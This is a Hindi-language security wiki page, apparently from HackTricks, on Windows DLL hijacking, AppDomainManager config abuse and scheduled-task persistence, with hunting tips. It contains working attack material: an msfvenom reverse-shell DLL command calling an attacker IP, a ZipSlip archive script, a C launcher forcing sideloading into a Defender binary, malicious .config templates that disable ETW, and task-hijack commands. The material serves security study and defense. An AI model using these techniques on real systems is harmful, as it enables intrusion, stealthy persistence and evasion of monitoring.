# DLL Hijacking

{{#include ../../../banners/hacktricks-training.md}}


## बुनियादी जानकारी

DLL Hijacking में किसी विश्वसनीय application से malicious DLL लोड करवाने के लिए उसमें हेरफेर किया जाता है। इस शब्द में **DLL Spoofing, Injection और Side-Loading** जैसी कई रणनीतियाँ शामिल हैं। इसका मुख्य उपयोग code execution और persistence हासिल करने के लिए किया जाता है, जबकि privilege escalation के लिए इसका उपयोग कम होता है। यहाँ escalation पर ध्यान देने के बावजूद, hijacking का तरीका अलग-अलग उद्देश्यों के लिए समान रहता है।

### आम तकनीकें

DLL hijacking के लिए कई तरीके इस्तेमाल किए जाते हैं। हर तरीके की प्रभावशीलता इस बात पर निर्भर करती है कि application DLL कैसे लोड करता है:<sup>[[4]](#references)</sup>

1. **DLL Replacement**: असली DLL को malicious DLL से बदलना। मूल DLL की functionality बनाए रखने के लिए वैकल्पिक रूप से DLL Proxying का उपयोग किया जा सकता है।
2. **DLL Search Order Hijacking**: malicious DLL को search path में legitimate DLL से पहले रखना और application के search pattern का फायदा उठाना।
3. **Phantom DLL Hijacking**: application के लिए एक malicious DLL बनाना, ताकि वह उसे ऐसी ज़रूरी DLL समझकर लोड करे जो वास्तव में मौजूद नहीं है।
4. **DLL Redirection**: application को malicious DLL की ओर निर्देशित करने के लिए `%PATH%` या `.exe.manifest` / `.exe.local` files जैसे search parameters में बदलाव करना।
5. **WinSxS DLL Replacement**: WinSxS directory में legitimate DLL को उसके malicious विकल्प से बदलना। यह तरीका अक्सर DLL side-loading से जुड़ा होता है।
6. **Relative Path DLL Hijacking**: malicious DLL को copied application के साथ, user के नियंत्रण वाली directory में रखना। यह Binary Proxy Execution तकनीकों जैसा है।

Application अपना **DLL loader** भी लागू कर सकता है। कोई privileged process `Libraries` या `Plugins` जैसी child directory की सूची बना सकता है और सामान्य Windows DLL search order से स्वतंत्र होकर चुनी गई DLL को किसी helper को दे सकता है। अगर कोई दूसरा account उसी directory में files बना सकता है, तो इसे जाँच के लिए एक सुराग मानें: process की identity, directory की प्रभावी ACL, file चुनने का नियम और load operation तक पहुँच की पुष्टि करें। किसी executable के पास writable directory होने से यह साबित नहीं होता कि process वहाँ से DLLs लोड करता है।

{{#ref}}
windows-cpython-build-landmark-sys-path-hijacking.md
{{#endref}}

### इंस्टॉलेशन के बाद PE import grafting

Classic side-loading में trusted PE को बदले बिना DLL name resolution को अपने पक्ष में किया जाता है। इसके विपरीत, **Import grafting** उस PE को संशोधित करता है जिसे trusted program पहले से लोड करता है। Attacker, attacker-controlled DLL के लिए एक import descriptor और उससे जुड़ी lookup/IAT entries जोड़ता है। जब Windows उस dependency को recursively resolve करता है, तो वह जोड़ी गई DLL को map करता है और उसके initialization code को अन्यथा legitimate process के भीतर चलाता है। यह disk पर किया गया PE modification है; यह runtime hook के ज़रिए live IAT function pointer को बदलने जैसी कार्रवाई नहीं है।<sup>[[31]](#references)[[32]](#references)</sup>

संशोधित PE, user या Task Scheduler द्वारा शुरू किए गए executable के बजाय कोई intermediate vendor DLL हो सकती है। दोबारा इस्तेमाल की जा सकने वाली chain इस प्रकार है:<sup>[[32]](#references)</sup>

1. Legitimate executable और उसकी dependencies को attacker-controlled directory में copy करें।
2. एक dependency की import structures को patch करें, ताकि वे malicious DLL को reference करें, और साथ ही dependency के अपेक्षित exports तथा सामान्य behavior को बनाए रखें।
3. Legitimate executable शुरू करने के लिए autorun या scheduled task configure करें। Loader, बदली हुई dependency और फिर नई import की गई DLL को map करता है। Task enumeration के लिए [Privilege Escalation with Autoruns](../privilege-escalation-with-autorun-binaries.md#scheduled-tasks) देखें।
4. `DllMain` में अधिक समय लेने वाला काम न करें; देखे गए loader ने worker thread बनाया और staged decryption वहीं जारी रखी।

यह vendor-side supply-chain compromise से अलग है, क्योंकि इस स्थिति में vendor package साफ़ होता है और import modification इंस्टॉलेशन के बाद किया जाता है। Staged directory के हर module की जाँच करें, केवल host EXE की नहीं: dependency import lists और hashes की तुलना किसी ज्ञात-साफ़ installation से करें, signatures सत्यापित करें और `C:\ProgramData` जैसी अप्रत्याशित writable locations से शुरू की गई vendor binaries की जाँच करें। ऐसी directory में copied crash reporter या updater की ओर इशारा करने वाला scheduled task जाँच के लिए विशेष रूप से उपयोगी सुराग है।<sup>[[32]](#references)</sup>


### AppDomainManager hijacking (`<exe>.config` + attacker assembly)

किसी trusted **.NET Framework** process से attacker code लोड करवाने का एकमात्र तरीका Classic DLL sideloading नहीं है। अगर target executable एक **managed** application है, तो CLR उस executable के नाम वाली **application configuration file** भी देखता है (उदाहरण के लिए `Setup.exe.config`)। यह file एक custom **AppDomainManager** परिभाषित कर सकती है। अगर config, EXE के पास रखी attacker-controlled assembly की ओर इशारा करता है, तो CLR उसे **application के सामान्य code path से पहले** लोड करता है और trusted process के भीतर चलाता है।<sup>[[24]](#references)</sup>

Microsoft के .NET Framework configuration schema के अनुसार, custom manager का उपयोग करने के लिए `<appDomainManagerAssembly>` और `<appDomainManagerType>` दोनों मौजूद होने चाहिए।<sup>[[16]](#references)[[17]](#references)</sup>

न्यूनतम config:

```xml
<configuration>
  <runtime>
    <appDomainManagerAssembly value="EvilMgr, Version=1.0.0.0, Culture=neutral, PublicKeyToken=null" />
    <appDomainManagerType value="EvilMgr.Loader" />
  </runtime>
</configuration>
```

न्यूनतम मैनेजर:

```csharp
using System; using System.Runtime.InteropServices;
public sealed class Loader : AppDomainManager {
  [DllImport("user32.dll")] static extern int MessageBox(IntPtr h, string t, string c, int m);
  public override void InitializeNewDomain(AppDomainSetup appDomainInfo) {
    MessageBox(IntPtr.Zero, "Loaded inside trusted .NET host", "AppDomain hijack", 0);
  }
}
```

Practical notes:
- यह **.NET Framework के लिए विशिष्ट** tradecraft है। यह Win32 DLL search order के बजाय CLR config parsing पर निर्भर करता है।
- होस्ट वास्तव में **managed EXE** होना चाहिए। त्वरित जांच: `sigcheck -m target.exe`, `corflags target.exe` चलाएं, या PE metadata में **CLR Runtime Header** देखें।
- Config filename का executable नाम से बिल्कुल मेल खाना चाहिए (`<binary>.config`) और यह आमतौर पर **EXE के पास** होता है।
- यह **signed Microsoft/vendor binaries** के साथ उपयोगी है, क्योंकि trusted EXE में कोई बदलाव नहीं होता, जबकि malicious managed assembly in-process execute होती है।
- यदि आपके पास पहले से कोई writable installer/update directory है, तो AppDomainManager hijacking को **पहले चरण** के रूप में इस्तेमाल किया जा सकता है, जिसके बाद आगे के चरणों में classic DLL sideloading या reflective loading इस्तेमाल की जा सकती है।

### Configuration-file gadget के रूप में signed AppDomainManager type

ऊपर दिया गया सामान्य AppDomainManager config hijack किसी attacker assembly को इंगित करता है। .NET Framework का एक अलग तरीका **signed assembly** का उपयोग करता है, जिसे होस्ट के साथ रखा जाता है या जिसे किसी अन्य तरीके से resolve किया जा सकता है; उसका manager type attacker-controlled sidecar data पढ़ता है। Attacker को अब भी managed host की adjacent `.exe.config` और secondary files पर नियंत्रण चाहिए; चुनी गई assembly पर signature होने से उसका configuration input सुरक्षित नहीं हो जाता। Config mechanism, स्थापित AppDomainManager behavior है, जबकि नीचे दिया गया signed-type chaining NetamLoader analysis में देखा गया था।<sup>[[16]](#references)[[17]](#references)[[35]](#references)</sup>

इस chain में, configuration `Microsoft.HostIntegration.Connectors` से `Microsoft.ApplicationServer.Caching.DataCacheFactoryConfiguration` चुनता है। इसका initialization application directory में `fabric.config` खोजता है। एक `customType` entry `System.Resources.ResXResourceSet` का नाम देती है और `Resources.resx` को इसके constructor argument के रूप में देती है, जिससे attacker द्वारा बनाई गई manager DLL भेजे बिना resource parser तक पहुंचा जा सकता है। इसके लिए target पर AppFabric-संबंधित signed assembly और नामित framework classes का resolve होना आवश्यक है; यह किसी भी managed EXE का सार्वभौमिक गुण नहीं है।<sup>[[35]](#references)</sup> Configured AppDomainManager के लिए full-trust application भी आवश्यक है; अन्यथा CLR `TypeLoadException` throw करता है।<sup>[[16]](#references)[[17]](#references)</sup>

```xml
<!-- in <host>.exe.config -->
<configuration>
  <runtime>
    <appDomainManagerType value="Microsoft.ApplicationServer.Caching.DataCacheFactoryConfiguration" />
    <appDomainManagerAssembly value="Microsoft.HostIntegration.Connectors, Version=1.0.0.0, Culture=neutral, PublicKeyToken=31bf3856ad364e35" />
  </runtime>
</configuration>
```

```xml
<!-- adjacent fabric.config -->
<section name="foo">
  <customType className="System.Resources.ResXResourceSet, System.Windows.Forms, Version=4.0.0.0, Culture=neutral, PublicKeyToken=b77a5c561934e089(Resources.resx)" />
</section>
```

`Resources.resx` content deserialization sink है, केवल data file नहीं; देखें [RESX to BinaryFormatter and XAML](../../../pentesting-web/deserialization/basic-.net-deserialization-objectdataprovider-gadgets-expandedwrapper-and-json.net.md#resx-resource-parsing-to-binaryformatter-and-xaml)। रिपोर्ट किए गए चरण में, XAML loader ने AES key को **पूरी host command line को lowercase करके** उसके SHA-256 hash से भी निकाला और decoded blob के पहले 16 bytes को IV के रूप में इस्तेमाल किया। इसलिए, अलग command line के साथ files को दोबारा चलाने पर अगला XAML load होने से पहले decryption विफल हो जाता है।<sup>[[35]](#references)</sup>

### Downloader + scheduled-task bootstrap के रूप में AppDomainManager

एक व्यावहारिक intrusion pattern में trusted managed EXE के साथ एक malicious `*.config` और एक malicious AppDomainManager DLL का उपयोग किया जाता है, जो केवल एक **छोटे bootstrapper** के रूप में काम करता है:<sup>[[25]](#references)</sup>

1. User किसी भरोसेमंद लगने वाली जगह, जैसे `%USERPROFILE%\Downloads`, से signed .NET installer या updater चलाता है।
2. पास की config, CLR से attacker assembly को **legitimate app logic शुरू होने से पहले** load करवाती है।
3. Malicious manager **path gate** लागू करता है (उदाहरण के लिए, आगे तभी बढ़ना जब host EXE `Downloads` से चल रहा हो, और second stage को केवल `%LOCALAPPDATA%` से चलने देना)।
4. Check सफल होने पर, यह असली payload को `%LOCALAPPDATA%\PerfWatson2.exe` जैसे user-writable path में download करता है और scheduled task के ज़रिए persistence स्थापित करता है।

यह variant क्यों मायने रखता है:
- Signed host EXE में कोई बदलाव नहीं होता, इसलिए केवल main binary का hash जाँचने वाली triage इस compromise को पकड़ने में विफल हो सकती है।
- सरल **path-based anti-analysis** आम है: ZIP/EXE/DLL की तिकड़ी को Desktop, Temp या sandbox path पर ले जाने से जानबूझकर chain टूट सकती है।
- First-stage AppDomainManager DLL छोटी और low-noise रह सकती है, जबकि असली implant बाद में fetch किया जाता है।

इस pattern के साथ अक्सर दिखने वाला minimal persistence उदाहरण:

```cmd
schtasks /create /tn "GoogleUpdaterTaskSystem140.0.7272.0" /sc onlogon /tr "%LOCALAPPDATA%\PerfWatson2.exe" /rl highest /f
```

नोट्स:
- ` /rl highest` का अर्थ उस user/session के लिए **उपलब्ध अधिकतम स्तर** है; यह अपने आप में SYSTEM तक escalation की गारंटी नहीं देता।
- इस technique को आम तौर पर classic missing-DLL search-order hijacking के बजाय **.NET config abuse के ज़रिए execution/persistence** के रूप में वर्गीकृत करना बेहतर है, भले ही operators अक्सर दोनों को एक साथ chain करते हैं।

जांच के संकेत:
- Signed .NET executables, जिन्हें **ZIP extraction paths**, `Downloads`, `%TEMP%` या अन्य user-writable folders से launch किया गया हो और जिनके साथ `<exe>.config` **उसी directory में** मौजूद हो।
- नए scheduled tasks, जिनका action `%LOCALAPPDATA%`, `%APPDATA%` या `Downloads` में किसी path की ओर संकेत करता हो और जिनके नाम browser/vendor updaters जैसे लगते हों।
- कुछ ही समय चलने वाली managed bootstrap processes, जो तुरंत एक और EXE download करती हैं और फिर `schtasks.exe` spawn करती हैं।
- ऐसे samples, जो तब तक जल्दी exit हो जाते हैं जब तक executable path किसी अपेक्षित user-profile directory से match न करे।

### sideload chain को फिर से launch करने के लिए किसी मौजूदा scheduled task को hijack करना

Persistence के लिए, केवल **नया task बनाने** की तलाश न करें। कुछ intrusion sets तब तक इंतज़ार करते हैं जब तक कोई legitimate installer एक **सामान्य updater task** न बना दे, फिर वे **task action को rewrite** कर देते हैं, ताकि मौजूदा name, author और trigger defenders को परिचित लगें।

दोबारा इस्तेमाल किया जा सकने वाला workflow:
1. Legitimate software install/run करें और पहचानें कि वह आम तौर पर कौन-सा task बनाता है।
2. Task XML export करें और मौजूदा `<Exec><Command>` / `<Arguments>` values नोट करें।<sup>[[23]](#references)</sup>
3. केवल action को बदलें, ताकि task किसी user-writable staging directory से आपका **trusted host EXE** शुरू करे; इसके बाद वह असली payload को side-load या AppDomain-load करता है।
4. नया, स्पष्ट persistence artifact बनाने के बजाय उसी task name को फिर से register करें।

```cmd
schtasks /query /tn "<TaskName>" /xml > task.xml
:: edit the <Exec><Command> and optional <Arguments> nodes
schtasks /create /tn "<TaskName>" /xml task.xml /f
```

यह अधिक stealthy क्यों है:
- Task का नाम अभी भी वैध दिख सकता है (उदाहरण के लिए, किसी vendor का updater)।
- इसे **Task Scheduler service** लॉन्च करती है, इसलिए parent/ancestor validation में अक्सर `explorer.exe` के बजाय अपेक्षित scheduling chain दिखाई देती है।
- जो DFIR teams केवल **नए task names** खोजती हैं, वे ऐसे task को चूक सकती हैं जिसका registration पहले से मौजूद था, लेकिन जिसकी action अब `%LOCALAPPDATA%`, `%APPDATA%` या attacker के नियंत्रण वाले किसी अन्य path की ओर इंगित करती है।

तेज़ hunting pivots:
- `schtasks /query /fo LIST /v | findstr /i "TaskName Task To Run"`
- `Get-ScheduledTask | % { [pscustomobject]@{TaskName=$_.TaskName; TaskPath=$_.TaskPath; Exec=($_.Actions | % Execute)} }`
- `C:\Windows\System32\Tasks\*` XML और `HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Schedule\TaskCache\Tree\*` metadata की baseline से तुलना करें।
- जब कोई **vendor जैसा दिखने वाला updater task** **user-writable directories** से execute हो या साथ में मौजूद `*.config` file वाली .NET EXE लॉन्च करे, तो alert करें।

> [!TIP]
> HTML staging, AES-CTR configs और .NET implants को DLL sideloading के साथ जोड़ने वाली step-by-step chain के लिए नीचे दिया गया workflow देखें।

{{#ref}}
advanced-html-staged-dll-sideloading.md
{{#endref}}

### Service command line से side-loaded stage को bind करना

Side-loaded DLL को अपेक्षित host EXE और DLL name से अधिक की आवश्यकता हो सकती है। Mandiant ने ऐसे loader का वर्णन किया, जो payload decryption को command-line argument और उसके host executable के name से bind करता है।<sup>[[33]](#references)</sup> बाद की एक service-backed chain में, कॉपी किए गए वैध host ने पास वाली `mscoree.dll` लोड की, जिसने `LockClrVersion` export किया और service argument तथा host executable basename से AES-128 key निकालने के बाद ही अपना embedded stage decrypt किया। हर input को 16 bytes तक truncate किया गया या NUL से pad किया गया; bytewise key `argument XOR embedded_key XOR executable_basename` थी, फिर payload को बिना padding के AES-CBC से decrypt किया गया। Host का नाम बदलने या उसे अपेक्षित argument के बिना लॉन्च करने से key बदल जाती है और यह stage decrypt नहीं हो पाता, भले ही DLL लोड होती रहे। इस variant को दोहराते या analyze करते समय सटीक command-line argument और basename को बनाए रखें।<sup>[[34]](#references)</sup>

यह **सामान्य DLL side-loading के ऊपर जोड़ा गया payload gate** है, कोई नया DLL search-order rule या अपने-आप में privilege-escalation primitive नहीं। परिणामी privilege level service के security context से तय होता है। [GitHub issue/file C2 workflow](../../../generic-methodologies-and-resources/github-issues-and-repository-files-c2.md) बाद के transport को अलग से दर्ज करता है।<sup>[[34]](#references)</sup>

## Missing DLLs ढूँढ़ना

किसी system में missing Dlls ढूँढ़ने का सबसे आम तरीका sysinternals से [procmon](https://docs.microsoft.com/en-us/sysinternals/downloads/procmon) चलाना और **निम्नलिखित 2 filters सेट करना** है:

![Common Techniques - Finding missing Dlls: The most common way to find missing Dlls inside a system is running procmon from sysinternals, setting the following 2 filters](<../../../images/image (961).png>)

![Common Techniques - Finding missing Dlls: The most common way to find missing Dlls inside a system is running procmon from sysinternals, setting the following 2 filters](<../../../images/image (230).png>)

और केवल **File System Activity** दिखाएँ:

![Common Techniques - Finding missing Dlls: and just show the File System Activity](<../../../images/image (153).png>)

अगर आप **सामान्य रूप से missing dlls** ढूँढ़ रहे हैं, तो इसे कुछ **सेकंड** तक चलने दें।\
अगर आप किसी **खास executable में missing DLL** ढूँढ़ रहे हैं, तो **"Process Name" "contains" `<exec name>`** जैसा एक और filter सेट करें, उसे execute करें और events capture करना बंद कर दें।<sup>[[9]](#references)</sup>

## Missing DLLs का शोषण

Privileges escalate करने के लिए ऐसी **DLL ढूँढ़ें जिसे कोई privileged process ऐसी जगह से load करने की कोशिश करता है जहाँ आप write कर सकते हैं**। ऐसा तब हो सकता है जब आप उस directory को नियंत्रित करते हों जिसे वैध DLL वाली directory से पहले search किया जाता है, या जब माँगी गई DLL मौजूद न हो और आप searched directories में से किसी एक में write कर सकते हों।

### DLL Search Order

[**Microsoft documentation**](https://docs.microsoft.com/en-us/windows/win32/dlls/dynamic-link-library-search-order#factors-that-affect-searching) में **आप देख सकते हैं कि DLLs को विशेष रूप से कैसे load किया जाता है।**

**Windows applications** पहले से तय **search paths** के क्रम का पालन करके DLLs ढूँढ़ती हैं। DLL hijacking की समस्या तब आती है जब कोई हानिकारक DLL इन directories में से किसी एक में रणनीतिक रूप से रखी जाती है, ताकि वह असली DLL से पहले load हो जाए। इसे रोकने का एक तरीका यह सुनिश्चित करना है कि application आवश्यक DLLs के लिए absolute paths का उपयोग करे।

नीचे **32-bit** systems में **DLL search order** दिया गया है:

1. वह directory जहाँ से application load हुई।
2. System directory। इस directory का path पाने के लिए [**GetSystemDirectory**](https://docs.microsoft.com/en-us/windows/desktop/api/sysinfoapi/nf-sysinfoapi-getsystemdirectorya) function का उपयोग करें।(_C:\Windows\System32_)
3. 16-bit system directory। इस directory का path पाने के लिए कोई function नहीं है, लेकिन इसे search किया जाता है। (_C:\Windows\System_)
4. Windows directory। इस directory का path पाने के लिए [**GetWindowsDirectory**](https://docs.microsoft.com/en-us/windows/desktop/api/sysinfoapi/nf-sysinfoapi-getwindowsdirectorya) function का उपयोग करें।
   1. (_C:\Windows_)
5. Current directory।
6. PATH environment variable में सूचीबद्ध directories। ध्यान दें कि इसमें **App Paths** registry key में निर्दिष्ट per-application path शामिल नहीं होता। DLL search path की गणना करते समय **App Paths** key का उपयोग नहीं होता।

**SafeDllSearchMode** enabled होने पर यह **default** search order है। Disabled होने पर current directory दूसरे स्थान पर आ जाती है। इस feature को disable करने के लिए **HKEY_LOCAL_MACHINE\System\CurrentControlSet\Control\Session Manager**\\**SafeDllSearchMode** registry value बनाएँ और इसे 0 पर सेट करें (default रूप से enabled है)।

अगर [**LoadLibraryEx**](https://docs.microsoft.com/en-us/windows/desktop/api/LibLoaderAPI/nf-libloaderapi-loadlibraryexa) function को **LOAD_WITH_ALTERED_SEARCH_PATH** के साथ call किया जाता है, तो search उस executable module की directory से शुरू होती है जिसे **LoadLibraryEx** load कर रहा है।

अंत में, DLL को name के बजाय absolute path से load किया जा सकता है। उस स्थिति में Windows केवल उसी path पर DLL को ढूँढ़ता है; name से माँगी गई dependencies पर लागू search order फिर भी लागू होता है।

Search order को बदलने के और भी तरीके हैं, लेकिन मैं यहाँ उनकी व्याख्या नहीं करूँगा।

### Arbitrary file write को missing-DLL hijack से जोड़ना

**संबंधित technique:** [privileged remediation के विरुद्ध oplock-gated mount-point switching](../kernel-race-condition-object-manager-slowdown.md#applied-chain-oplock-gated-mount-point-switch-against-privileged-remediation).

1. उन DLL names को इकट्ठा करने के लिए **ProcMon** filters (`Process Name` = target EXE, `Path` ends with `.dll`, `Result` = `NAME NOT FOUND`) का उपयोग करें जिन्हें process probe करता है, लेकिन ढूँढ़ नहीं पाता।<sup>[[14]](#references)</sup>
2. अगर binary **schedule/service** पर चलती है, तो उन names में से किसी एक वाली DLL को **application directory** (search-order entry #1) में रखने पर वह अगले execution में load होगी। .NET scanner के एक मामले में, असली copy को `C:\Program Files\dotnet\fxr\...` से load करने से पहले process ने `C:\samples\app\` में `hostfxr.dll` ढूँढ़ी।
3. Payload DLL (जैसे, reverse shell) को किसी भी export के साथ बनाएँ: `msfvenom -p windows/x64/shell_reverse_tcp LHOST=<attacker_ip> LPORT=443 -f dll -o hostfxr.dll`.
4. अगर आपका primitive **ZipSlip-style arbitrary write** है, तो ऐसा ZIP बनाएँ जिसकी entry extraction dir से बाहर निकलकर DLL को app folder में रखे:

```python
import zipfile
with zipfile.ZipFile("slip-shell.zip", "w") as z:
    z.writestr("../app/hostfxr.dll", open("hostfxr.dll","rb").read())
```

5. Archive को watched inbox/share में पहुँचाएँ; जब scheduled task process को फिर से launch करेगा, तो वह malicious DLL load करेगा और service account के रूप में आपका code execute करेगा।

### RTL_USER_PROCESS_PARAMETERS.DllPath के जरिए sideloading को बाध्य करना

नए बनाए गए process के DLL search path को नियत रूप से प्रभावित करने का एक उन्नत तरीका है, ntdll के native APIs से process बनाते समय RTL_USER_PROCESS_PARAMETERS में DllPath field सेट करना। यहाँ attacker-controlled directory देने पर, कोई target process जो imported DLL को नाम से resolve करता है (बिना absolute path के और safe loading flags का उपयोग किए बिना), उस directory से malicious DLL load करने के लिए बाध्य किया जा सकता है।

मुख्य विचार
- RtlCreateProcessParametersEx से process parameters बनाएँ और एक custom DllPath दें, जो आपके नियंत्रित folder (उदाहरण के लिए, वह directory जहाँ आपका dropper/unpacker मौजूद है) की ओर इंगित करता हो।
- RtlCreateUserProcess से process बनाएँ। जब target binary किसी DLL को नाम से resolve करेगा, तो loader resolution के दौरान दिए गए DllPath को देखेगा, जिससे reliable sideloading संभव होगा, भले ही malicious DLL target EXE के साथ उसी directory में न हो।

नोट्स/सीमाएँ
- इसका असर बनाए जा रहे child process पर होता है; यह SetDllDirectory से अलग है, जो केवल current process को प्रभावित करता है।
- Target को किसी DLL को नाम से import करना या LoadLibrary करना होगा (बिना absolute path के और LOAD_LIBRARY_SEARCH_SYSTEM32/SetDefaultDllDirectories का उपयोग किए बिना)।
- KnownDLLs और hardcoded absolute paths को hijack नहीं किया जा सकता। Forwarded exports और SxS precedence बदल सकते हैं।

न्यूनतम C उदाहरण (ntdll, wide strings, सरलीकृत error handling):

<details>
<summary>पूरा C उदाहरण: RTL_USER_PROCESS_PARAMETERS.DllPath के जरिए DLL sideloading को बाध्य करना</summary>

```c
#include <windows.h>
#include <winternl.h>
#pragma comment(lib, "ntdll.lib")

// Prototype (not in winternl.h in older SDKs)
typedef NTSTATUS (NTAPI *RtlCreateProcessParametersEx_t)(
    PRTL_USER_PROCESS_PARAMETERS *pProcessParameters,
    PUNICODE_STRING ImagePathName,
    PUNICODE_STRING DllPath,
    PUNICODE_STRING CurrentDirectory,
    PUNICODE_STRING CommandLine,
    PVOID Environment,
    PUNICODE_STRING WindowTitle,
    PUNICODE_STRING DesktopInfo,
    PUNICODE_STRING ShellInfo,
    PUNICODE_STRING RuntimeData,
    ULONG Flags
);

typedef NTSTATUS (NTAPI *RtlCreateUserProcess_t)(
    PUNICODE_STRING NtImagePathName,
    ULONG Attributes,
    PRTL_USER_PROCESS_PARAMETERS ProcessParameters,
    PSECURITY_DESCRIPTOR ProcessSecurityDescriptor,
    PSECURITY_DESCRIPTOR ThreadSecurityDescriptor,
    HANDLE ParentProcess,
    BOOLEAN InheritHandles,
    HANDLE DebugPort,
    HANDLE ExceptionPort,
    PRTL_USER_PROCESS_INFORMATION ProcessInformation
);

static void DirFromModule(HMODULE h, wchar_t *out, DWORD cch) {
    DWORD n = GetModuleFileNameW(h, out, cch);
    for (DWORD i=n; i>0; --i) if (out[i-1] == L'\\') { out[i-1] = 0; break; }
}

int wmain(void) {
    // Target Microsoft-signed, DLL-hijackable binary (example)
    const wchar_t *image = L"\\??\\C:\\Program Files\\Windows Defender Advanced Threat Protection\\SenseSampleUploader.exe";

    // Build custom DllPath = directory of our current module (e.g., the unpacked archive)
    wchar_t dllDir[MAX_PATH];
    DirFromModule(GetModuleHandleW(NULL), dllDir, MAX_PATH);

    UNICODE_STRING uImage, uCmd, uDllPath, uCurDir;
    RtlInitUnicodeString(&uImage, image);
    RtlInitUnicodeString(&uCmd, L"\"C:\\Program Files\\Windows Defender Advanced Threat Protection\\SenseSampleUploader.exe\"");
    RtlInitUnicodeString(&uDllPath, dllDir);      // Attacker-controlled directory
    RtlInitUnicodeString(&uCurDir, dllDir);

    RtlCreateProcessParametersEx_t pRtlCreateProcessParametersEx =
        (RtlCreateProcessParametersEx_t)GetProcAddress(GetModuleHandleW(L"ntdll.dll"), "RtlCreateProcessParametersEx");
    RtlCreateUserProcess_t pRtlCreateUserProcess =
        (RtlCreateUserProcess_t)GetProcAddress(GetModuleHandleW(L"ntdll.dll"), "RtlCreateUserProcess");

    RTL_USER_PROCESS_PARAMETERS *pp = NULL;
    NTSTATUS st = pRtlCreateProcessParametersEx(&pp, &uImage, &uDllPath, &uCurDir, &uCmd,
                                                NULL, NULL, NULL, NULL, NULL, 0);
    if (st < 0) return 1;

    RTL_USER_PROCESS_INFORMATION pi = {0};
    st = pRtlCreateUserProcess(&uImage, 0, pp, NULL, NULL, NULL, FALSE, NULL, NULL, &pi);
    if (st < 0) return 1;

    // Resume main thread etc. if created suspended (not shown here)
    return 0;
}
```

</details>

व्यावहारिक उपयोग का उदाहरण
- अपनी DllPath डायरेक्टरी में एक malicious xmllite.dll रखें (जो आवश्यक functions export करती हो या वास्तविक DLL को proxy करती हो)।
- ऊपर दी गई technique का उपयोग करके नाम से xmllite.dll खोजने वाली किसी ज्ञात signed binary को launch करें। Loader दिए गए DllPath के ज़रिए import resolve करता है और आपकी DLL को sideload करता है।

यह technique वास्तविक हमलों में multi-stage sideloading chains चलाने के लिए देखी गई है: एक शुरुआती launcher helper DLL छोड़ता है, जो फिर एक Microsoft-signed, hijackable binary को custom DllPath के साथ spawn करता है, ताकि attacker की DLL को staging directory से load कराया जा सके।<sup>[[6]](#references)</sup>


### `.exe.config` के ज़रिए .NET AppDomainManager hijacking

**.NET Framework** targets के लिए, application की साथ वाली **`.exe.config`** file का दुरुपयोग करके memory patch किए बिना **`Main()` से पहले** sideloading की जा सकती है। केवल Win32 DLL search order पर निर्भर रहने के बजाय, attacker एक वैध .NET EXE के साथ malicious config और attacker-controlled assemblies रखता है।

यह chain कैसे काम करती है:<sup>[[15]](#references)[[22]](#references)</sup>
1. Host EXE शुरू होता है और **CLR `<exe>.config` को पढ़ता है**।
2. Config **`<appDomainManagerAssembly>`** और **`<appDomainManagerType>`** सेट करता है, ताकि runtime attacker-controlled `AppDomainManager` को instantiate करे।
3. Malicious manager को trusted host process के अंदर **`Main()` से पहले execution** मिलता है।
4. यही config CLR को पहले local assemblies resolve करने के लिए मजबूर कर सकता है (उदाहरण के लिए `InitInstall.dll`, `Updater.dll`, `uevmonitor.dll`) और inline patching के बिना runtime validation/telemetry को कमजोर कर सकता है।

Campaign-शैली का pattern (सटीक nesting directive / CLR version के अनुसार बदल सकती है):

```xml
<configuration>
  <runtime>
    <appDomainManagerAssembly value="Updater" />
    <appDomainManagerType value="MyAppDomainManager" />
    <assemblyBinding xmlns="urn:schemas-microsoft-com:asm.v1">
      <probing privatePath="." />
      <publisherPolicy apply="no" />
    </assemblyBinding>
    <bypassTrustedAppStrongNames enabled="true" />
    <etwEnable enabled="false" />
  </runtime>
  <startup>
    <requiredRuntime version="v4.0.30319" safemode="true" />
  </startup>
</configuration>
```

यह उपयोगी क्यों है:
- **`<probing privatePath="."/>`** assembly resolution को application directory तक सीमित रखता है, जिससे यह फ़ोल्डर एक अनुमानित sideloading surface बन जाता है।<sup>[[18]](#references)</sup>
- **`<appDomainManagerAssembly>` + `<appDomainManagerType>`** CLR initialization के दौरान, legitimate app logic चलने से पहले, execution को attacker code में ले जाते हैं।<sup>[[16]](#references)[[17]](#references)</sup>
- **`<bypassTrustedAppStrongNames enabled="true"/>`** full-trust app को strong-name validation failure के बिना unsigned या tampered assemblies load करने दे सकता है।<sup>[[19]](#references)</sup>
- **`<publisherPolicy apply="no"/>`** newer assemblies पर publisher-policy redirects से बचाता है।<sup>[[20]](#references)</sup>
- **`<requiredRuntime ... safemode="true"/>`** runtime selection को अधिक पूर्वानुमेय बनाता है।<sup>[[21]](#references)</sup>
- **`<etwEnable enabled="false"/>`** विशेष रूप से दिलचस्प है, क्योंकि इसमें implant द्वारा memory में `EtwEventWrite` patch करने के बजाय, configuration से **CLR अपनी ETW visibility बंद करता है**।

हालिया campaigns में देखा गया operational pattern:
- Stage 1 में `setup.exe`, `setup.exe.config` और local assemblies drop की जाती हैं।
- Stage 2 में इन्हें एक विश्वसनीय दिखने वाले **AppData update** folder में copy किया जाता है, host का नाम बदलकर `update.exe` जैसा कुछ रखा जाता है, और इसे **scheduled task** के ज़रिए फिर से launch किया जाता है।
- Stage 3 में final RAT DLL/export load करने से पहले execution context की पुष्टि की जाती है (उदाहरण के लिए, Task Scheduler से अपेक्षित parent `svchost.exe` की पुष्टि)।

Hunting के सुझाव:
- User-writable locations में संदिग्ध पास की **`.config`** files के साथ चलने वाले signed या अन्यथा legitimate **.NET executables**।
- **`appDomainManagerAssembly`**, **`appDomainManagerType`**, **`probing privatePath="."`**, **`bypassTrustedAppStrongNames`**, या **`etwEnable enabled="false"`** वाली `.config` files।
- ऐसे scheduled tasks जो **`%LOCALAPPDATA%`** या app-specific `\bin\update\` directories से renamed update binaries को फिर से launch करते हैं।
- ऐसे parent/child chains जिनमें scheduled task किसी trusted .NET host को launch करता है, जो तुरंत अपनी directory से non-vendor assemblies load करता है।

#### Windows docs में DLL search order के अपवाद

Windows documentation में standard DLL search order के कुछ अपवाद बताए गए हैं:

- जब **पहले से memory में loaded DLL के समान नाम वाली DLL** मिलती है, तो system सामान्य search को छोड़ देता है। इसके बजाय, default रूप से memory में मौजूद DLL का उपयोग करने से पहले redirection और manifest की जाँच की जाती है। **इस स्थिति में, system DLL को search नहीं करता**।
